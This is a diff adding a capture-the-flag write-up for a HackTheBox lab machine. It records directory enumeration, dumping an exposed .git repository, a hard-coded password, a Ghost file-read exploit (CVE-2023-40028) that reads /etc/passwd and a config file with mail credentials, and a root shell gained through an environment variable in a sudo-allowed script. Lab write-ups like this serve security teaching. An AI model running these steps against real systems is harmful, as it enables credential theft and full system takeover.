@@ -82,6 +82,183 @@ ETag: W/"141-WmsCc1HaGe8LTfiB0aC23VZZfzM"
 http://linkvortex.htb/ghost/
 
 =>http://dev.linkvortex.htb/cgi-bin/ : 403 forbidden
+```
+
+## 3. dirsearch
+```python
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ dirsearch -u http://dev.linkvortex.htb
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
+ (_||| _) (/_(_|| (_| )                                                                                                                
+                                                                                                                                       
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/Desktop/htb/reports/http_dev.linkvortex.htb/_25-03-16_22-50-45.txt
+
+Target: http://dev.linkvortex.htb/
+
+[22:50:45] Starting:                                                                                                                   
+[22:51:02] 200 -   41B  - /.git/HEAD                                        
+[22:51:02] 200 -  557B  - /.git/                                            
+[22:51:02] 200 -   73B  - /.git/description                                 
+[22:51:02] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        
+[22:51:02] 200 -  201B  - /.git/config
+[22:51:02] 200 -  620B  - /.git/hooks/                                      
+[22:51:02] 200 -  402B  - /.git/info/       
+```
+
+## 4. git dump
+
+```python
+# virtual env
+┌──(kali㉿kali)-[~/Tools/git-dumper]
+└─$ python3 -m venv git_dumper    
+                                                  
+┌──(kali㉿kali)-[~/Tools/git-dumper]
+└─$ source git_dumper/bin/activate
 
 
+┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper]
+└─$ python3 git_dumper.py http://dev.linkvortex.htb website
+
+┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper/website]
+└─$ ls    
+Dockerfile.ghost  LICENSE  PRIVACY.md  README.md  SECURITY.md  apps  ghost  nx.json  package.json  yarn.lock
+
+┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper/website]
+└─$ git status                    
+Not currently on any branch.
+Changes to be committed:
+  (use "git restore --staged <file>..." to unstage)
+        new file:   Dockerfile.ghost
+        modified:   ghost/core/test/regression/api/admin/authentication.test.js
+
+
+┌──(git_dumper)─(kali㉿kali)-[~/Tools/git-dumper/website]
+└─$ cat ghost/core/test/regression/api/admin/authentication.test.js | grep pass
+            const password = 'OctopiFociPilfer45';
+                        password,
+
+
+┌──(kali㉿kali)-[~/Desktop/htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
+└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
+
+root:x:0:0:root:/root:/bin/bash
+node:x:1000:1000::/home/node:/bin/bash
+
+Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
+File content:
+{
+  "url": "http://localhost:2368",
+  "server": {
+    "port": 2368,
+    "host": "::"
+  },
+  "mail": {
+    "transport": "Direct"
+  },
+  "logging": {
+    "transports": ["stdout"]
+  },
+  "process": "systemd",
+  "paths": {
+    "contentPath": "/var/lib/ghost/content"
+  },
+  "spam": {
+    "user_login": {
+        "minWait": 1,
+        "maxWait": 604800000,
+        "freeRetries": 5000
+    }
+  },
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+      }
+    }
+}
+
+```
+## 5. ssh
+```                                          
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ ssh bob@10.129.112.91 
+
+bob@linkvortex:~$ ls
+user.txt
+```
+
+# root flag
+## 1. sudo -l
+```bash
+bob@linkvortex:~$ sudo -l
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
+    env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+```
+
+## 2. /opt/ghost/clean_symlink.sh
+
+```bash
+bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
+#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+  /usr/bin/echo "! First argument must be a png file !"
+  exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo "Content:"
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+    fi
+  fi
+fi
+```
+
+## 3. exploit
+```bash
+bob@linkvortex:~$ export CHECK_CONTENT=TRUE
+
+bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./test_link.png 
+Link found [ ./test_link.png ] , moving it to quarantine
+/opt/ghost/clean_symlink.sh: line 25: TRUE: command not found <- ** this is interesting LOL.**
+
+
+bob@linkvortex:~$ export CHECK_CONTENT=bash
+bob@linkvortex:~$ ln -s test.png test_link.png
+bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./test_link.png 
+Link found [ ./test_link.png ] , moving it to quarantine
+root@linkvortex:/home/bob# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
